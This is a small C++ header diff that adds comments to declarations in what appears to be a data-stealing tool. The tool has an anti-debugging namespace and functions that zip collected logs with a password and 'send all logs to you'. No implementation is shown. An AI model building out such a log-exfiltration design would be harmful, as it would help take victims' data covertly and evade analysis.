@@ -33,11 +33,19 @@ namespace antidebug {
 
 namespace manager {
 	/// <summary>
-	/// make needed dirs
+	/// makes needed dirs
 	/// </summary>
 	void MakeDirs();
 
+	/// <summary>
+	/// compresses all logs into .zip with the password
+	/// </summary>
 	void MakeZip();
 
+	/// <summary>
+	/// send all logs to you
+	/// </summary>
+	/// <param name="zipName"></param>
+	/// <param name="zipPwd"></param>
 	void Send(const std::string zipName, const std::string zipPwd);
 }
